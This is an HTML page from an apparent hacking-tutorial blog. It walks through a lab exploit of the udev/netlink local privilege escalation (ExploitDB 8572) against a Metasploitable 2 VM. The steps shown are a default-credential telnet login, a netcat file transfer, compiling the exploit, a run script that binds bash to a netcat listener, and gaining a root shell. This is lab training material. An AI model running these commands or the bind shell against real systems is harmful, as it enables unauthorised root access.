@@ -1,0 +1,117 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="stylesheet" href="main.css" type="text/css" />
+<link rel="stylesheet" href="blog.css" type="text/css" />
+<link rel="alternate" type="application/rss+xml" title="Subscribe to this page..." href="feed.rss" />
+<title>m3t4lk3y &mdash; Posts tagged "privilege-escalation"</title>
+</head><body>
+<div id="divbodyholder">
+<div class="headerholder"><div class="header">
+<div id="title">
+<h1 class="nomargin"><a class="ablack" href="https://metalkey.net/index.html">m3t4lk3y</a></h1>
+<div id="description">Hacking tutorials + info</div>
+</div></div></div>
+<div id="divbody"><div class="content">
+<h3><a class="ablack" href="linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html">
+Linux Kernel 2.6 UDEV &lt; 141 – Local Privilege Escalation Exploit Example
+</a></h3>
+<!-- bashblog_timestamp: #201607021852.36# -->
+<div class="subtitle">July 02, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+<strong>Attacker:</strong> Kali Linux<br>
+<strong>Victim:</strong> Metasploitable 2<br>
+<br>
+Note: This exploit leverages a vulnerability in NETLINK.<br>
+More information on NETLINK can be found on the Linux Foundation website (<a href="http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto">http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto</a>).</p>
+
+<h2>Download the Exploit from ExploitDB</h2>
+
+<p>Head over to the Exploit Database and download Jon Oberheide’s udev exploit for Linux Kernel 2.6 (<a href="https://www.exploit-db.com/exploits/8572/">https://www.exploit-db.com/exploits/8572/</a>).</p>
+
+<h2>Telnet to Metasploitable 2, then Upload and Compile the Exploit</h2>
+
+<p>Telnet to Metasploitable 2 then start a netcat listener.<br>
+In Kali, We’re going to tar the exploit and pipe the output to netcat.<br>
+In Metasploitable 2, we’re going to receive and untar the exploit, then compile it with gcc.
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>telnet 192.168.1.10</com><br>
+Trying 192.168.1.10...<br>
+Connected to 192.168.1.10.<br>
+<br>
+Contact: msfdev[at]metasploit.com<br>
+Login with msfadmin/msfadmin to get started<br>
+metasploitable login: <com>msfadmin</com><br>
+Password: <com>msfadmin</com><br>
+Linux metasploitable 2.6.24-16-server #1 SMP i686<br>
+<br>
+msfadmin@metasploitable:~$ <com>nc -lvp 12345 | tar -xf -</com><br>
+listening on [any] 12345 ...
+</div>
+
+<p></code>
+Open a new tab, tar the exploit and pipe the output to netcat
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>tar -cf - 8572.c | nc -vn 192.168.1.10 12345</com><br>
+(UNKNOWN) [192.168.1.10] 12345 (?) open
+</div>
+
+<p></code>
+Back in the first tab we can see our Kali Machine connect.<br>
+Allow a few seconds for the file transfer to complete then CTRL+C to end the session.<br>
+Check the exploit has been received, then compile with gcc.<br>
+<code></p>
+
+<div class="code">
+connect to [192.168.1.10] from kali [192.168.1.182] 48411<br>
+msfadmin@metasploitable:~$ <com>ls -lah 8572.c</com><br>
+-rw-r--r-- 1 msfadmin msfadmin 2.9K 2015-11-05 04:14 8572.c<br>
+msfadmin@metasploitable:~$ <com>gcc 8572.c -o 8572</com>
+</div>
+
+<p></code></p>
+
+<h2>Executing the Exploit</h2>
+
+<p>Now we just need to get the PID of the the udevd netlink socket on Metasploitable 2, create our run script (bind an instance of bash to a netcat listener) and execute the exploit
+<code></p>
+
+<div class="code">
+msfadmin@metasploitable:~$ <com>cat /proc/net/netlink</com><br>
+df552800 15 2738 00000001 0 0 00000000 2<br>
+msfadmin@metasploitable:~$ <com>cd /tmp</com><br>
+msfadmin@metasploitable:/tmp$ <com>nano run</com><br>
+<com>#!/bin/bash</com><br>
+<com>nc -lvvp 2345 -e /bin/bash</com><br>
+msfadmin@metasploitable:/tmp$ <com>cd</com><br>
+msfadmin@metasploitable:~$ <com>./8572 2738</com><br>
+</div>
+
+<p></code>
+Open a new tab and connect to the bind shell
+<code></p>
+
+<div class="code">
+root@kali:~$ <com>nc -vn 192.168.1.10 2345</com><br>
+(UNKNOWN) [192.168.1.10] 2345 (?) open<br>
+<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
+root@metasploitable:/# <com>whoami</com><br>
+root
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>
+<!-- text end -->
+</div>
+<div id="footer">CC by-nc-nd <a href="https://twitter.com/m3t4lk3y">metalkey</a> &mdash; <a href="mailto:"></a><br/>
+Generated with <a href="https://github.com/cfenollosa/bashblog">bashblog</a>, a single bash script to easily create blogs like this one</div>
+</div></div>
+</body></html>
